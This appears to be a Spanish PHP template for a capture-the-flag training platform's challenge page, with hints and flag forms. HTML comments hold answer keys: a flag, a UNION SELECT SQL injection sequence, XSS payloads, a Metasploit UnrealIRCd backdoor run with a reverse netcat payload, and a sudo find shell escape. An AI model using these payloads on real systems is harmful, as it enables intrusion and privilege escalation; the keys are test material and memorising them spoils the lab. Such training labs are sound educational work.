<div class="backdrop-page">
<section class="panel">
    <span class="eyebrow"><?= htmlspecialchars($reto['categoria'], ENT_QUOTES, 'UTF-8'); ?></span>
    <h1>Reto <?= htmlspecialchars((string) $reto['numero'], ENT_QUOTES, 'UTF-8'); ?>: <?= htmlspecialchars($reto['titulo'], ENT_QUOTES, 'UTF-8'); ?></h1>
    <p><?= htmlspecialchars($reto['objetivo'], ENT_QUOTES, 'UTF-8'); ?></p>
    <div class="detail-grid">
        <article>
            <h2>Dificultad</h2>
            <p><?= htmlspecialchars($reto['dificultad'], ENT_QUOTES, 'UTF-8'); ?></p>
        </article>
        <article>
            <h2>Puntaje</h2>
            <p><?= htmlspecialchars((string) $reto['puntaje'], ENT_QUOTES, 'UTF-8'); ?> puntos</p>
        </article>
        <article>
            <h2>Estado</h2>
            <p><?= $isCompleted ? 'Completado' : htmlspecialchars($reto['estado'], ENT_QUOTES, 'UTF-8'); ?></p>
        </article>
        <article>
            <h2>Tus puntos</h2>
            <p><?= htmlspecialchars((string) $totalPoints, ENT_QUOTES, 'UTF-8'); ?> puntos</p>
        </article>
    </div>
</section>

<?php if ($reto['slug'] === 'reto01-osint'): ?>
    <!-- eliminar este comentario antes de producción -->
    <!-- FLAG{ReCo#_Pa$!ivO} -->
<?php endif; ?>

<?php if ($reto['slug'] === 'reto07-sqli-datos'): ?>
    <!-- ' ORDER BY 1# // Usar para ver cuantas columnas hay cambiando el numero -->
    <!-- ' UNION SELECT 1,username,3,4 FROM users# // ver usuarios -->
    <!-- ' UNION SELECT 1,2,3,4 FROM users# // ver en que columna se imprimen los datos -->
    <!-- ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'# // ver datos importantes y el "secret necesario" -->
    <!-- ' UNION SELECT 1,secret,3,4 FROM users# // SQLI correcto para mostrar la flag -->
<?php endif; ?>

<?php if ($reto['slug'] === 'reto08-xss'): ?>
    <!-- codigo usado para la explotacion: <img src=x onerror="alert(flag)"> -->
    <!-- otra forma de explotar: <body onload=alert(flag)> -->
<?php endif; ?>

<?php if ($reto['slug'] === 'reto11-metasploit'): ?>
    <!-- nmap -sV IpUsuario -p 6667 //RECONOCER EL SERVICIO -->
    <!-- 6667/tcp open irc UnrealIRCd //RESULTADO -->
    <!-- msfconsole // terminal -->
    <!-- search unreal //buscar exploit -->
    <!-- exploit/unix/irc/unreal_ircd_3281_backdoor -->
    <!-- use exploit/unix/irc/unreal_ircd_3281_backdoor //seleccionar exploit -->
    <!-- configurar objetivo -->
    <!-- set RHOSTS 192.168.56.112 -->
    <!-- set payload cmd/unix/reverse_netcat -->
    <!-- set LHOST 192.168.56.112 -->
    <!-- run //ejecutar -->
    <!-- resultado -->
    <!-- Connected to 192.168.56.112:6667 -->
    <!-- Sending backdoor command -->
    <!-- Exploit completed -->
    <!-- OTRA TERMINAL -->
    <!-- nc 192.168.56.112 6667 // ejecutar luego Escribir algo para sacar la flag -->
<?php endif; ?>

<?php if ($reto['slug'] === 'reto12-privesc'): ?>
    <!-- codigo para subir privilegios: sudo find . -exec /bin/sh \; -quit -->
<?php endif; ?>

<section class="panel">
    <h2>Herramientas y enfoque</h2>
    <p><?= htmlspecialchars(implode(', ', $reto['herramientas']), ENT_QUOTES, 'UTF-8'); ?></p>
</section>

<?php if ($reto['slug'] === 'reto02-nmap'): ?>
    <section class="panel split-module">
        <article class="split-card">
            <h2>Notas del escaneo</h2>
            <p>Realizar el escaneo ver que puertos estan abiertos y escribir el comando completo para el escaneo de los puertos
                por ejemplo: nmap "ip".
            </p>
        </article>
        <article class="split-card">
            <h2>Verificar respuesta</h2>
            <p>Cuando tengas el resultado, validalo aqui para revelar la flag del reto.</p>

            <form class="answer-form" action="<?= htmlspecialchars(route('reto/respuesta'), ENT_QUOTES, 'UTF-8'); ?>" method="post">
                <input type="hidden" name="slug" value="<?= htmlspecialchars($reto['slug'], ENT_QUOTES, 'UTF-8'); ?>">
                <label class="field-label" for="scan-answer">Respuesta</label>
                <input id="scan-answer" name="answer" type="text" autocomplete="off" required>
                <button class="button" type="submit">Verificar respuesta</button>
            </form>
        </article>
    </section>

    <?php if (!empty($answerResult)): ?>
        <div class="answer-modal" role="dialog" aria-modal="true" aria-labelledby="answer-modal-title" onclick="if (event.target === this) this.remove();">
            <div class="answer-modal-card answer-modal-<?= htmlspecialchars($answerResult['type'], ENT_QUOTES, 'UTF-8'); ?>">
                <button class="answer-modal-close" type="button" aria-label="Cerrar mensaje" onclick="this.closest('.answer-modal').remove();">x</button>
                <strong id="answer-modal-title"><?= $answerResult['type'] === 'success' ? 'Respuesta correcta' : 'Respuesta incorrecta'; ?></strong>
                <p><?= htmlspecialchars($answerResult['message'], ENT_QUOTES, 'UTF-8'); ?></p>
            </div>
        </div>
    <?php endif; ?>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto03-puertos'): ?>
    <section class="panel split-module">
        <article class="split-card">
            <h2>Analisis de puertos</h2>
            <p>Realiza un escaneo de puertos sobre el objetivo y revisa cuales aparecen abiertos.</p>
        </article>
        <article class="split-card">
            <h2>Verificar respuesta</h2>
            <p>Escribe los puertos que estan abiertos</p>

            <form class="answer-form" action="<?= htmlspecialchars(route('reto/respuesta'), ENT_QUOTES, 'UTF-8'); ?>" method="post">
                <input type="hidden" name="slug" value="<?= htmlspecialchars($reto['slug'], ENT_QUOTES, 'UTF-8'); ?>">
                <label class="field-label" for="port-answer">Respuesta</label>
                <input id="port-answer" name="answer" type="text" autocomplete="off" required>
                <button class="button" type="submit">Verificar respuesta</button>
            </form>
        </article>
    </section>

    <?php if (!empty($answerResult)): ?>
        <div class="answer-modal" role="dialog" aria-modal="true" aria-labelledby="answer-modal-title" onclick="if (event.target === this) this.remove();">
            <div class="answer-modal-card answer-modal-<?= htmlspecialchars($answerResult['type'], ENT_QUOTES, 'UTF-8'); ?>">
                <button class="answer-modal-close" type="button" aria-label="Cerrar mensaje" onclick="this.closest('.answer-modal').remove();">x</button>
                <strong id="answer-modal-title"><?= $answerResult['type'] === 'success' ? 'Respuesta correcta' : 'Respuesta incorrecta'; ?></strong>
                <p><?= htmlspecialchars($answerResult['message'], ENT_QUOTES, 'UTF-8'); ?></p>
            </div>
        </div>
    <?php endif; ?>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto04-servicios'): ?>
    <section class="panel split-module">
        <article class="split-card">
            <h2>Enumeracion de servicios</h2>
            <p>Analiza los servicios detectados y sus versiones. Usa la informacion del banner o el resultado de version detection para identificar la tecnologia expuesta.</p>
        </article>
        <article class="split-card">
            <h2>Verificar respuesta</h2>
            <p>Que puerto adicional tiene un servicio HTTP activo?</p>

            <form class="answer-form" action="<?= htmlspecialchars(route('reto/respuesta'), ENT_QUOTES, 'UTF-8'); ?>" method="post">
                <input type="hidden" name="slug" value="<?= htmlspecialchars($reto['slug'], ENT_QUOTES, 'UTF-8'); ?>">
                <label class="field-label" for="service-answer">Respuesta</label>
                <input id="service-answer" name="answer" type="text" autocomplete="off" required>
                <button class="button" type="submit">Verificar respuesta</button>
            </form>
        </article>
    </section>

    <?php if (!empty($answerResult)): ?>
        <div class="answer-modal" role="dialog" aria-modal="true" aria-labelledby="answer-modal-title" onclick="if (event.target === this) this.remove();">
            <div class="answer-modal-card answer-modal-<?= htmlspecialchars($answerResult['type'], ENT_QUOTES, 'UTF-8'); ?>">
                <button class="answer-modal-close" type="button" aria-label="Cerrar mensaje" onclick="this.closest('.answer-modal').remove();">x</button>
                <strong id="answer-modal-title"><?= $answerResult['type'] === 'success' ? 'Respuesta correcta' : 'Respuesta incorrecta'; ?></strong>
                <p><?= htmlspecialchars($answerResult['message'], ENT_QUOTES, 'UTF-8'); ?></p>
            </div>
        </div>
    <?php endif; ?>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto05-credenciales'): ?>
    <section class="panel hint-module">
        <h2>Pistas</h2>
        <p>- No todos los servicios se encuentran en los puertos tradicionales. Explora más allá de lo evidente.</p>
        <p>- Accede al servicio identificado y analiza cuidadosamente su contenido.</p>
        <p>- No toda la información es visible directamente en la página.</p>
    </section>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto06-sqli-login'): ?>
    <section class="panel hint-module">
        <h2>Pistas</h2>
        <p>- No siempre es necesario conocer la contraseña para acceder.</p>
        <p>- Observa cómo se construyen las consultas al enviar datos.</p>
    </section>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto07-sqli-datos'): ?>
    <section class="panel hint-module">
        <h2>Pistas</h2>
        <p>- El login no filtra correctamente lo que escribes… prueba pensar como la base de datos.</p>
        <p>- No todo se trata de iniciar sesión… ¿y si puedes hacer que la consulta devuelva más información?</p>
        <p>- Si usas UNION SELECT, recuerda que debes coincidir con el número de columnas de la consulta original.</p>
        <p>- observa qué datos sí se muestran después del login…</p>
        <p>- Puede que te encuentres algun "secret" por ahí.</p>
    </section>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto08-xss'): ?>
    <section class="panel hint-module">
        <h2>Pistas</h2>
        <p>- Lo que escribes en el comentario se muestra directamente en la página… ¿el navegador siempre lo interpretará como texto?</p>
        <p>- No todos los scripts necesitan etiquetas &lt;script&gt; para ejecutarse.</p>
        <p>- Algunos elementos HTML pueden ejecutar código cuando ocurre un evento.</p>
    </section>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto09-stego'): ?>
    <section class="panel hint-module">
        <h2>Pistas</h2>
        <p>- No todo lo que ves en una imagen es lo único que contiene.</p>
        <p>- Algunos archivos pueden ocultarse dentro de otros sin alterar su apariencia.</p>
        <p>- La imagen ya la has visto varias veces.</p>
    </section>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto10-cve'): ?>
    <section class="panel hint-module">
        <h2>Pistas</h2>
        <p>- La versión del servicio puede ser más importante de lo que parece.</p>
        <p>- Muchas vulnerabilidades conocidas están documentadas públicamente.</p>
        <p>- Investiga si la versión detectada tiene historial de CVEs.</p>
    </section>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto11-metasploit'): ?>
    <section class="panel hint-module">
        <h2>Pistas</h2>
        <p>-  El servicio expuesto utiliza una versión vulnerable de UnrealIRCd.</p>
        <p>- Identifica el puerto correcto antes de buscar el exploit.</p>
        <p>- Existe un módulo oficial en Metasploit Framework para esta vulnerabilidad.</p>
        <p>- Configura correctamente RHOSTS y el payload antes de ejecutar el exploit.</p>
        <p>- Después de la explotación puede ser necesaria una reconexión manual al servicio.</p>
    </section>
<?php endif; ?>

<?php if ($reto['slug'] === 'reto12-privesc'): ?>
    <section class="panel hint-module">
        <h2>Pistas</h2>
        <p>- Empieza identificando el usuario actual y los permisos sudo disponibles sudo -l.</p>
        <p>- Algunos binarios permitidos en sudo pueden utilizarse para ejecutar comandos arbitrarios.</p>
        <p>- GTFOBins puede ayudarte a identificar tecnicas validas de escalada.</p>
        <p>- La evidencia final permanece protegida dentro del sistema y requiere privilegios elevados para acceder.</p>
    </section>
<?php endif; ?>

<section class="panel flag-panel">
    <div>
        <h2>Verificar flag</h2>
        <p>Ingresa la flag encontrada para validar tu progreso en este reto.</p>
    </div>

    <?php if (empty($flagResult) && $isCompleted): ?>
        <p class="form-alert form-alert-success" role="status">Este reto ya esta completado.</p>
    <?php endif; ?>

    <form class="flag-form" action="<?= htmlspecialchars(route('reto/verificar'), ENT_QUOTES, 'UTF-8'); ?>" method="post">
        <input type="hidden" name="slug" value="<?= htmlspecialchars($reto['slug'], ENT_QUOTES, 'UTF-8'); ?>">
        <label for="flag">Flag</label>
        <div class="flag-actions">
            <input id="flag" name="flag" type="text" placeholder="flag{...}" autocomplete="off" required>
            <button class="button" type="submit">Verificar flag</button>
        </div>
    </form>

    <div class="challenge-actions">
        <a class="button button-secondary" href="<?= htmlspecialchars(route('retos'), ENT_QUOTES, 'UTF-8'); ?>">Volver al listado</a>
        <?php if ($nextReto !== null): ?>
            <a class="button" href="<?= htmlspecialchars(route('reto?slug=' . $nextReto['slug']), ENT_QUOTES, 'UTF-8'); ?>">Siguiente reto</a>
        <?php endif; ?>
    </div>
</section>

<?php if (!empty($flagResult)): ?>
    <div class="answer-modal" role="dialog" aria-modal="true" aria-labelledby="flag-modal-title" onclick="if (event.target === this) this.remove();">
        <div class="answer-modal-card answer-modal-<?= htmlspecialchars($flagResult['type'], ENT_QUOTES, 'UTF-8'); ?>">
            <button class="answer-modal-close" type="button" aria-label="Cerrar mensaje" onclick="this.closest('.answer-modal').remove();">x</button>
            <strong id="flag-modal-title"><?= $flagResult['type'] === 'success' ? 'Flag correcta' : 'Flag incorrecta'; ?></strong>
            <?php if ($flagResult['type'] === 'success' || $flagResult['type'] === 'error'): ?>
                <img
                    class="answer-modal-image"
                    src="<?= htmlspecialchars(asset('assets/img/' . ($flagResult['type'] === 'success' ? 'feliz.png' : 'triste.png')), ENT_QUOTES, 'UTF-8'); ?>"
                    alt="<?= $flagResult['type'] === 'success' ? 'Celebracion' : 'Error'; ?>"
                >
            <?php endif; ?>
            <p><?= htmlspecialchars($flagResult['message'], ENT_QUOTES, 'UTF-8'); ?></p>
        </div>
    </div>
<?php endif; ?>
</div>
